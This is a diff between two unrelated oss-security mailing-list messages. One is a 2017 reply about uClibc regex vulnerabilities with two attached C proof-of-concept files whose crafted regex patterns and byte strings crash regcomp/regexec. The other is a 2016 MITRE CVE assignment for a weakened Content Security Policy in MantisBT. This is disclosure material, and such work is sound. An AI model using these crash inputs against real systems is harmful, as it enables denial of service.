@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1673" "Friday" "23" "June" "2017" "23:20:41" "+0200" "Waldemar Brodkorb" "wbx@uclibc-ng.org" "<20170623212041.GT26922@waldemar-brodkorb.de>" "73" "Re: [oss-security] two vulns in  uClibc-0.9.33.2" "^Cc:" nil nil "6" "2017062321:20:41" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        wbx@uclibc-n Jun 23   73/1673  " thread-indent "\"Re: [oss-security] two vulns in  uClibc-0.9.33.2\"\n") "<tencent_453378A5461E2AE54D551FA1@qq.com>" ("<tencent_453378A5461E2AE54D551FA1@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1782" "Monday" "29" "August" "2016" "17:51:35" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160829215135.463377BC071@smtpvmsrv1.mitre.org>" "47" "[oss-security] Re: MantisBT weakened CSP when using bundled Gravatar plugin" nil nil nil "8" "2016082921:51:35" "[oss-security] Re: MantisBT weakened CSP when using bundled Gravatar plugin" (number mark "U       cve-assign@m Aug 29   47/1782  " thread-indent "\"[oss-security] Re: MantisBT weakened CSP when using bundled Gravatar plugin\"\n") "<ea35113c-d493-4bf7-ca47-9df7891dde67@mantisbt.org>" ("<ea35113c-d493-4bf7-ca47-9df7891dde67@mantisbt.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14231 invoked by uid 550); 23 Jun 2017 21:55:15 -0000
+Received: (qmail 7450 invoked by uid 550); 29 Aug 2016 21:51:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,94 +11,60 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 3967 invoked from network); 23 Jun 2017 21:20:52 -0000
-Message-ID: <20170623212041.GT26922@waldemar-brodkorb.de>
-References: <tencent_453378A5461E2AE54D551FA1@qq.com>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="CD/aTaZybdUisKIc"
-Content-Disposition: inline
-In-Reply-To: <tencent_453378A5461E2AE54D551FA1@qq.com>
-X-Operating-System: Linux 3.16.0-4-amd64 x86_64
-User-Agent: Mutt/1.5.23 (2014-03-12)
-Cc: Peter Korsgaard <peter@korsgaard.com>,
-	"Anthony G. Basile" <basile@freeharbor.net>,
-	oss-security <oss-security@lists.openwall.com>
-Date: Fri, 23 Jun 2017 23:20:41 +0200
-From: Waldemar Brodkorb <wbx@uclibc-ng.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] two vulns in  uClibc-0.9.33.2
-To: fefe <qbenjin@qq.com>
+Received: (qmail 7424 invoked from network); 29 Aug 2016 21:51:47 -0000
+From: cve-assign@mitre.org
+To: dregad@mantisbt.org
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+In-Reply-To: <ea35113c-d493-4bf7-ca47-9df7891dde67@mantisbt.org>
+Message-Id: <20160829215135.463377BC071@smtpvmsrv1.mitre.org>
+Date: Mon, 29 Aug 2016 17:51:35 -0400 (EDT)
+Subject: [oss-security] Re: MantisBT weakened CSP when using bundled Gravatar plugin
 
---CD/aTaZybdUisKIc
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Hi,
-fefe wrote,
-
-> >> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
+> MantisBT 1.3.0-rc.2 introduced a new bundled plugin to handle display of
+> users' avatars using Gravatar.
 > 
-> >uClibc is dead. Active development happens on uClibc-ng. Is uClibc-ng
-> also affected by these issues?
+> Instead of adding the Gravatar web site to the list of allowed image
+> sources in MantisBT's Content Security Policy, the plugin was replacing
+> the whole policy by:
 > 
+>    img-src 'self' http://www.gravatar.com/
 > 
-> uclibc_ng is also affected.
- 
-I tried to cross-compile attached code and run it in
-qemu-system-arm.
+> instead of the more strict default one of:
+> 
+>    default-src 'self'; frame-ancestors 'none'; style-src 'self';
+>    script-src 'self'
+> 
+> Relaxed policy allows execution of remote and inline scripts, e.g.
+> potentially enabling XSS attacks.
+> 
+> https://github.com/mantisbt/mantisbt/commit/b3511d2feb47eaee41feb5f69cf3c8a2c9acd229
+> https://mantisbt.org/bugs/view.php?id=21263
 
-What should be the result?
+Use CVE-2016-7111.
 
-I see a segfault for poc2.c. But this also happens with glibc
-based system.
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Is the complete app code just plain wrong?
-Can you provide full application code and the results showing the
-issue?
-
-best regards
- Waldemar
-
---CD/aTaZybdUisKIc
-Content-Type: text/x-csrc; charset=utf-8
-Content-Disposition: attachment; filename="poc1.c"
-
-#include <sys/types.h>
-#include <regex.h>
-
-int main() {
-
-   regex_t regtmp;
-
-   if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
-        {               
-                regmatch_t pmatch[1];
-                regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
-                regfree(&regtmp);
-        }
-
-}
-
---CD/aTaZybdUisKIc
-Content-Type: text/x-csrc; charset=utf-8
-Content-Disposition: attachment; filename="poc2.c"
-
-#include <sys/types.h>
-#include <regex.h>
-
-int main() {
-
-   regex_t regtmp;
-
-if(regcomp 
-(&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD",
- REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
-        {               
-                regmatch_t pmatch[1];
-                regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
-                regfree(&regtmp);
-        }
-
-}
-
---CD/aTaZybdUisKIc--
+iQIcBAEBCAAGBQJXxK4MAAoJEHb/MwWLVhi2p3EQAKULs3JDc49mBXeyVZ24IUoE
+6iWcUGjwiE5cHXnAxcNKZZp7/xsFo9tgdLbLZ37x48kU1cwp/B/rnQQCWJHfUJxJ
+gR0qIutmEWCAq3nIVC0IR+tBm//0iiJuTuRhH/NjE9W4+EBPPjIHkkHxvnWLqyJo
+SWBP/JJDYbB8sQ366+WLrNHTdxK+keVcu406KrbagWhPaMG1C9QAkTeHRxovI/me
+JkbA3cVjfmO9BjHrAkbEYEJRU6Qxn8XsXUNW8bGoHBUt4WFON8BOGpt6Yyn1iDCs
+APOou4yZqMPM8jSnS8MOCM9POuuK8QNXMTLPgnMkxLcFntz79ogVmzJYfl6jyQ6V
+PW2dNtFU03QTI4nvL2UbVi1+oEbZycQbRnU0If7wHjedXIekFEX2uik0fAnJRwAk
+LDgT/+g6g02RJZPmteQFrT0ZtXav2rFiznHicL93mRLt1sOiE32ULJrQ8DLBP5SA
+EYitfKS09oBLDdSC5k+wogX22UgoFm4xZLrauVbRMKUApZNvKVSAADNewmRopXKR
+Fm2lDPJKmmb+oOWVBj7MDz7J9u1SvnyVieX+53E8Bt0tnr9KD5R61XNfjnKJtvZg
++2l+S8HEUN3FdDz2WINbs9z1Sd5Fok9jc+TQXeIXR07jPC+MKE26zywhIiMYIfl/
+2Rs4hh+EhmuT20OUq14x
+=U1Gg
+-----END PGP SIGNATURE-----
